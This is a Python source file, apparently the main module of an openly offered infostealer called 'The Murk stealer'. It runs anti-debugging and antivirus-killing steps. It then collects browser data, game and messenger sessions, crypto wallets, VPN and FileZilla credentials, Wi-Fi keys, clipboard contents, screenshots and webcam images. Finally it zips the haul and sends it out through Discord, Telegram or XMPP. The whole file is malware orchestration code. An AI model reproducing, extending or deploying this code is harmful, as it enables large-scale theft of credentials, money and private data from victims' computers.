#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from manager import make_folder
from system import system_info
from system import programs
from system import photos
from games import Minecraft
from messengers import telegram
from manager import send 
from manager import clear
from games import steam
from messengers import discord
from games import epicGames
from messengers import whatsapp
from games import roblox
from wallets import wallets
from messengers import skype
from games import BattleNET
from games import Uplay
from config import config
from manager import ending
from messengers import viber
from browsers import chromium
from files import Files_txt
from files import file_grubber
from secure import antiDebug
from files import filezilla
from vpn import vpn
from messengers import pidgin
from system import productkey
from system import wifi
from system import clipboard
from browsers import geckodriver

def Start() -> None:
    if not config.Config.debuging:
        antiDebug.AntiDebug(config.Config.oneStart,config.Config.avKiller)
    make_folder.makeFolders(config.Config.enableFileGrubber,config.Config.oneStart)
def GrubFiles() -> None:
    if config.Config.enableFileGrubber:
        config.Config.msgFiles= file_grubber.Grab(config.Config.msgFiles)
    else:
        Files_txt.TxtSteal()
    filezilla.FileZilla()

def Browsers() -> None:
    chromium.Browsers()
    config.Config.msgBrowsers = chromium.Browsers.Return()
    config.Config.msgBrowsers = geckodriver.GeckoDriver(config.Config.msgBrowsers)

def Games() -> None:
    config.Config.msgOther = epicGames.Epic(config.Config.msgOther)
    config.Config.msgOther = Uplay.Ubisoft(config.Config.msgOther)
    config.Config.msgOther = Minecraft.Minecraft(config.Config.msgOther)
    config.Config.msgOther = roblox.roblox(config.Config.msgOther)
    config.Config.msgOther = steam.Steam(config.Config.msgOther)
    config.Config.msgOther =BattleNET.BattleNet(config.Config.msgOther)

def Messagers() -> None:
    config.Config.msgOther = skype.skype(config.Config.msgOther)
    config.Config.msgOther = telegram.Telegram(config.Config.msgOther)
    config.Config.msgOther = viber.Viber(config.Config.msgOther)
    config.Config.msgOther = discord.Discord(config.Config.msgOther)
    config.Config.msgOther = whatsapp.WhatsApp(config.Config.msgOther)
    config.Config.msgOther = pidgin.Pidgin(config.Config.msgOther)

def VPN() -> None:
    config.Config.msgVPN= vpn.VPN(config.Config.msgVPN)

def System() -> None:
    config.Config.msgSYS = system_info.SystemInfo(config.Config.msgSYS)
    productkey.PKay()
    wifi.Wifi()
    clipboard.ClipBoard()


def Other() -> None:
    config.Config.msgWallets = wallets.Wallets(config.Config.msgWallets)
    programs.Programs()
    photos.Screenshot()
    photos.WebCam()

def End() -> None:
    try:
        config.Config.np = clear.makemeZip(config.Config.name,config.Config.password,config.Config.np)
    except Exception as e:
        print(e)
    try:
        send.Send(config.Config.sendType,config.Config.np,config.Config.msgSYS,config.Config.msgBrowsers,config.Config.msgOther,config.Config.msgWallets,config.Config.msgFiles,config.Config.msgVPN,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
    except Exception as e:
        print(e)
    ending.End(config.Config.np)

def Main()-> None:
    Start()
    GrubFiles()
    Browsers()
    Games()
    Messagers()
    VPN()
    System()
    Other()
    End()

